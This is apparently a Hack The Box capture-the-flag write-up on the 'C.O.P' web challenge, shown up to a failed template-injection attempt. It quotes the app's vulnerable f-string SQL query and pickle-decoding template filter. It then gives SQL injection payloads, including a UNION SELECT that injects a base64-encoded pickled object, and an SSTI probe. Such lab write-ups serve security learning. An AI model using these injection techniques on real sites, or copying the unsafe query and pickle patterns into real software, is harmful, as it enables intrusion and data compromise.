# HTB-Challenges-Web-COP

## Challenge Description
The C.O.P (Cult of Pickles) have started up a new web store to sell their merch. We believe that the funds are being used to carry out illicit pickle-based propaganda operations! Investigate the site and try and find a way into their operation!

![localhost_1337_(Nest Hub Max)](https://github.com/patzj/HTB-Challenges-Web-COP/assets/10325457/999d7d68-5db6-4b8f-b08c-5e9a6186d433)

## Reconnaissance
While scanning the code, two files stood out: **application/models.py** and **application/blueprints/routes.py**. Analyzing the code within these files reveals a concerning vulnerability. The application appears to be using path parameters directly within its SQL queries, without proper validation or sanitization. This practice makes the application highly susceptible to SQL injection attacks (SQLi).
```py
class shop(object):

    @staticmethod
    def select_by_id(product_id):
        return query_db(f"SELECT data FROM products WHERE id='{product_id}'", one=True)

    @staticmethod
    def all_products():
        return query_db('SELECT * FROM products')    
```

The application uses the Jinja2 template engine, which is known to be vulnerable to SSTI attacks if not configured correctly. Additionally, before displaying, the data also undergoes processing using Jinja Filters, as indicated by the syntax `{% set item = product | pickle %}`

```jinja
<div class="row gx-4 gx-lg-5 align-items-center">
    {% set item = product | pickle %}
    <div class="col-md-6"><img class="card-img-top mb-5 mb-md-0" src="{{ item.image }}" alt="..." /></div>
    <div class="col-md-6">
        <h1 class="display-5 fw-bolder">{{ item.name }}</h1>
        <div class="fs-5 mb-5">
            <span>Â£{{ item.price }}</span>
        </div>
        <p class="lead">{{ item.description }}</p>
    </div>
</div>
```

The method of storing data in the database is intriguing. Each row consolidates information into a single field, employing an encoding technique that uses `pickle` and `base64`. This leads to the use of Jinja Filters for decoding the data.

```py
with open('schema.sql', mode='r') as f:
    shop = map(lambda x: base64.b64encode(pickle.dumps(x)).decode(), items)
    get_db().cursor().executescript(f.read().format(*list(shop)))
```

## Scanning
Initially, I conducted a test for SQL injection. It's worth noting that the application employs SQLite, limiting the potential for Remote Code Execution (RCE) in this context.

![localhost_1337_view_%27%20OR%20%271%27%3D%271](https://github.com/patzj/HTB-Challenges-Web-COP/assets/10325457/7f5c3012-f028-4bb7-a379-6e5df22d1c4b)

We successfully injected the payload `' OR '1'='1` or `%27%20OR%20%271%27%3D%271` into the product ID via URL path parameters, allowing us to retrieve the first item. Now, our goal is to display an item that we can control, facilitating testing for Server-Side Template Injection (SSTI) or template injection.

To achieve this, I plan to create a Python script that generates a dictionary with fields similar to those the application uses. Since Jinja accesses both objects and dictionaries using dot notation, a dictionary will suffice. Additionally, I'll encode it in a way that the application can decode and display as intended.

```py
evil_item = {
    "name": "Some name",
    "description": "Some description",
    "price": "100",
    "image": "/static/images/not_found.jpg",
}

print(base64.b64encode(pickle.dumps(evil_item)).decode())
# gASVbgAAAAAAAAB9lCiMBG5hbWWUjAlTb21lIG5hbWWUjAtkZXNjcmlwdGlvbpSMEFNvbWUgZGVzY3JpcHRpb26UjAVwcmljZZSMAzEwMJSMBWltYWdllIwcL3N0YXRpYy9pbWFnZXMvbm90X2ZvdW5kLmpwZ5R1Lg==
```

With the encoded item in hand, my next step is to showcase it in the application. I'll employ the `UNION` technique. Initially, I'll deliberately attempt to fetch non-existent data from the database and then append my encoded object to the result. This ensures that my encoded object becomes the sole data returned by the query.

```sql
' UNION SELECT 'gASVbgAAAAAAAAB9lCiMBG5hbWWUjAlTb21lIG5hbWWUjAtkZXNjcmlwdGlvbpSMEFNvbWUgZGVzY3JpcHRpb26UjAVwcmljZZSMAzEwMJSMBWltYWdllIwcL3N0YXRpYy9pbWFnZXMvbm90X2ZvdW5kLmpwZ5R1Lg==
```
```

```

![localhost_1337_view_%27%20UNION%20SELECT%20%27gASVbgAAAAAAAAB9lCiMBG5hbWWUjAlTb21lIG5hbWWUjAtkZXNjcmlwdGlvbpSMEFNvbWUgZGVzY3JpcHRpb26UjAVwcmljZZSMAzEwMJSMBWltYWdllIwcL3N0YXRpYy9pbWFnZXMvbm90X2ZvdW5kLmpwZ5R1Lg%3D%3D](https://github.com/patzj/HTB-Challenges-Web-COP/assets/10325457/25844325-c408-4ac3-b16f-4ab560be673f)

## Exploitation 1 - SSTI *(Failed)*
Now that I have a way to inject a payload that controls the application's dynamic aspects, I can attempt various vulnerabilities to read the flag. The first vulnerability to test is SSTI, so I will create a payload to confirm if the application is susceptible to it.

```py
evil_item = {
    "name": "{{ 7*7 }}",
    "description": "{{ 7*7 }}",
    "price": "{{ 7*7 }}",
    "image": "{{ 7*7 }}",
}
```

Unfortunately for me, it's not.
